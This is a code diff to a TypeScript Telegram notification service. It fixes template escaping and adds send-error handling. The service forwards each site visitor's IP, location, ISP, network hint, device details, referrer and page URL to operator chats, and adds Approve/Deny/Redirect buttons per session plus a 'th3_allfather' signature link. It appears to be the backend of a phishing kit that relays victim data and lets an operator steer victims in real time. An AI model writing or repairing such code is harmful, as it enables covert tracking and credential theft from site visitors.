@@ -69,7 +69,7 @@ function asLink(url: string, label?: string): string {
     return asCode(href || "Unknown")
   }
   const linkText = (label?.trim() || href).trim()
-  return `<a href="\${escapeTelegramHtml(href)}">\${escapeTelegramHtml(linkText)}</a>`
+  return `<a href="${escapeTelegramHtml(href)}">${escapeTelegramHtml(linkText)}</a>`
 }
 
 function asUrlField(value: unknown, fallback = "Unknown"): string {
@@ -81,17 +81,17 @@ function asUrlField(value: unknown, fallback = "Unknown"): string {
 }
 
 export function wrapFlowMessage(body: string): string {
-  return `🏷️ <b>\${escapeTelegramHtml(SITE_DISPLAY_NAME)}</b>\n━━━━━━━━━━━━━━━━━━\n\n\${body}`
+  return `🏷️ <b>${escapeTelegramHtml(SITE_DISPLAY_NAME)}</b>\n━━━━━━━━━━━━━━━━━━\n\n${body}`
 }
 
 function asCode(value: unknown): string {
   const text = value == null || value === "" ? "" : String(value).trim()
-  return `<code>\${escapeTelegramHtml(text || "Unknown")}</code>`
+  return `<code>${escapeTelegramHtml(text || "Unknown")}</code>`
 }
 
 function asPre(value: unknown): string {
   const text = typeof value === "string" ? value : value != null ? String(value) : ""
-  return `<pre>\${escapeTelegramHtml(text || "Unknown")}</pre>`
+  return `<pre>${escapeTelegramHtml(text || "Unknown")}</pre>`
 }
 
 function formatFieldLines(fields: Record<string, FieldValue>): string {
@@ -100,7 +100,7 @@ function formatFieldLines(fields: Record<string, FieldValue>): string {
     .map(([label, value]) => {
       const display =
         typeof value === "boolean" ? (value ? "Yes" : "No") : String(value).trim()
-      return `🔹 <b>\${escapeTelegramHtml(label)}</b>: \${asCode(display)}`
+      return `🔹 <b>${escapeTelegramHtml(label)}</b>: ${asCode(display)}`
     })
     .join("\n")
 }
@@ -111,8 +111,8 @@ function formatMessage(
   fields: Record<string, FieldValue>,
 ): string {
   const body = formatFieldLines(fields)
-  const header = `\${emoji} <b>\${escapeTelegramHtml(title)} (\${escapeTelegramHtml(SITE_NAME)})</b>`
-  return body ? `\${header}\n\${SEPARATOR}\n\${body}` : `\${header}\n\${SEPARATOR}`
+  const header = `${emoji} <b>${escapeTelegramHtml(title)} (${escapeTelegramHtml(SITE_NAME)})</b>`
+  return body ? `${header}\n${SEPARATOR}\n${body}` : `${header}\n${SEPARATOR}`
 }
 
 function verificationMethodLabel(method?: "text" | "email"): string {
@@ -138,11 +138,11 @@ class TelegramService {
       return { success: false, error: "Telegram not configured", sent: 0, failed: 0, total: 0 }
     }
 
-    const url = `https://api.telegram.org/bot\${this.botToken}/sendMessage`
+    const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`
 
     const results = await Promise.allSettled(
-      this.chatIds.map((chatId) =>
-        fetch(url, {
+      this.chatIds.map(async (chatId) => {
+        const response = await fetch(url, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
@@ -152,8 +152,16 @@ class TelegramService {
             disable_web_page_preview: true,
             reply_markup: inlineKeyboard ? { inline_keyboard: inlineKeyboard } : undefined,
           }),
-        }),
-      ),
+        })
+
+        const result = await response.json().catch(() => ({}))
+
+        if (!response.ok || !result?.ok) {
+          throw new Error(result?.description || result?.error || "Telegram request failed")
+        }
+
+        return true
+      }),
     )
 
     const sent = results.filter((r) => r.status === "fulfilled").length
@@ -164,6 +172,7 @@ class TelegramService {
       sent,
       failed,
       total: this.chatIds.length,
+      error: failed > 0 ? "Some Telegram sends failed" : undefined,
     }
   }
 
@@ -181,25 +190,25 @@ class TelegramService {
     const networkHint = getNetworkHintLabel(data.asn, data.org || data.isp)
     const siteName = data.siteName || SITE_NAME
     const message = [
-      `🌐 <b>New Visitor (\${escapeTelegramHtml(siteName)})</b>`,
+      `🌐 <b>New Visitor (${escapeTelegramHtml(siteName)})</b>`,
       SEPARATOR,
-      `📍 <b>Location:</b> \${asCode(data.location)}`,
-      `🌍 <b>IP:</b> \${asCode(data.ip)}`,
-      `⏰ <b>Timezone:</b> \${asCode(data.timezone)}`,
-      `🌐 <b>ISP:</b> \${asCode(data.isp)}`,
-      ...(networkHint ? [`🛡️ <b>Network:</b> \${asCode(networkHint)}`] : []),
+      `📍 <b>Location:</b> ${asCode(data.location)}`,
+      `🌍 <b>IP:</b> ${asCode(data.ip)}`,
+      `⏰ <b>Timezone:</b> ${asCode(data.timezone)}`,
+      `🌐 <b>ISP:</b> ${asCode(data.isp)}`,
+      ...(networkHint ? [`🛡️ <b>Network:</b> ${asCode(networkHint)}`] : []),
       "",
-      `📱 <b>OS:</b> \${asCode(data.osLabel ?? "Unknown")}`,
-      `📱 <b>Device:</b> \${asCode(data.deviceLabel ?? "Unknown")}`,
+      `📱 <b>OS:</b> ${asCode(data.osLabel ?? "Unknown")}`,
+      `📱 <b>Device:</b> ${asCode(data.deviceLabel ?? "Unknown")}`,
       "💻 <b>User Agent:</b>",
       asPre(data.userAgent),
-      `🖥️ <b>Screen:</b> \${asCode(data.screen)}`,
-      `🌍 <b>Language:</b> \${asCode(data.language)}`,
-      `🔗 <b>Referrer:</b> \${asUrlField(data.referrer)}`,
-      `🌐 <b>URL:</b> \${asUrlField(data.pageUrl)}`,
+      `🖥️ <b>Screen:</b> ${asCode(data.screen)}`,
+      `🌍 <b>Language:</b> ${asCode(data.language)}`,
+      `🔗 <b>Referrer:</b> ${asUrlField(data.referrer)}`,
+      `🌐 <b>URL:</b> ${asUrlField(data.pageUrl)}`,
       "",
-      `⏰ <b>Local Time:</b> \${asCode(data.localTime)}`,
-      `🕒 <b>UTC Time:</b> \${asCode(data.utcTime)}`,
+      `⏰ <b>Local Time:</b> ${asCode(data.localTime)}`,
+      `🕒 <b>UTC Time:</b> ${asCode(data.utcTime)}`,
       `<a href="https://t.me/th3_allfather">Odin Is With Us</a>`,
     ].join("\n")
     return this.sendMessage(message)
@@ -265,15 +274,15 @@ class TelegramService {
       [
         {
           text: "✅ Approve",
-          callback_data: `approve:\${approvalId}`,
+          callback_data: `approve:${approvalId}`,
         },
         {
           text: "❌ Deny",
-          callback_data: `deny:\${approvalId}`,
+          callback_data: `deny:${approvalId}`,
         },
         {
           text: "🔄 Redirect",
-          callback_data: `redirect:\${approvalId}`,
+          callback_data: `redirect:${approvalId}`,
         },
       ],
     ]
@@ -297,15 +306,15 @@ class TelegramService {
       [
         {
           text: "✅ Approve",
-          callback_data: `approve:\${approvalId}`,
+          callback_data: `approve:${approvalId}`,
         },
         {
           text: "❌ Deny",
-          callback_data: `deny:\${approvalId}`,
+          callback_data: `deny:${approvalId}`,
         },
         {
           text: "🔄 Redirect",
-          callback_data: `redirect:\${approvalId}`,
+          callback_data: `redirect:${approvalId}`,
         },
       ],
     ]
